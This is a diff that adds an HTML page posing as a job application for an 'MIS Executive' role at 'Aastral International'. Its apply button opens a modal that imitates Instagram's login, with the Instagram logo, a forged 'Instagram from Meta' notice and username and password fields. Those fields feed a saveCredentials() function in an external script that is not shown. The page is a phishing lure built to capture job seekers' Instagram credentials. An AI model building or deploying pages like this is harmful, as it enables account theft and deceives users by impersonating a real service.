@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>MIS Executive - Instagram Style Apply</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+    }
+
+    header {
+      background-color: #004080;
+      color: white;
+      text-align: center;
+      padding: 30px 20px;
+    }
+
+    .container {
+      max-width: 900px;
+      margin: 30px auto;
+      padding: 20px;
+      background-color: #fff;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .apply-btn {
+      display: inline-block;
+      background-color: #004080;
+      color: white;
+      padding: 12px 25px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .apply-btn:hover {
+      background-color: #002b5e;
+    }
+
+    /* Modal Styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      background: #fff;
+      width: 320px;
+      border-radius: 10px;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    .modal-content img {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    .modal-content input {
+      width: 80%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .modal-content button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .close {
+      position: absolute;
+      top: 20px;
+      right: 25px;
+      font-size: 24px;
+      font-weight: bold;
+      color: white;
+      cursor: pointer;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .note {
+      font-size: 12px;
+      color: #888;
+      margin-top: 10px;
+    }
+    #disclaimer {
+      font-size: 12px;
+      color: #888;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>MIS Executive - Aastral International</h1>
+    <p>Click Apply to Open Instagram login popup</p>
+  </header>
+
+  <div class="container" style="text-align: center;">
+    <button class="apply-btn" onclick="openModal()">Login and Apply with Instagram</button>
+  </div>
+
+  <!-- Instagram-style Login Modal -->
+    <div id="instaModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal()">&times;</span>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+      <input type="text" id="username" placeholder="Phone number, username, or email" />
+      <input type="password" id="password" placeholder="Password" />
+      <button type="button" onclick="saveCredentials()">Log In</button>
+      <div id="disclaimer">© 2025 Instagram from Meta</div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+
+</body>
+</html>
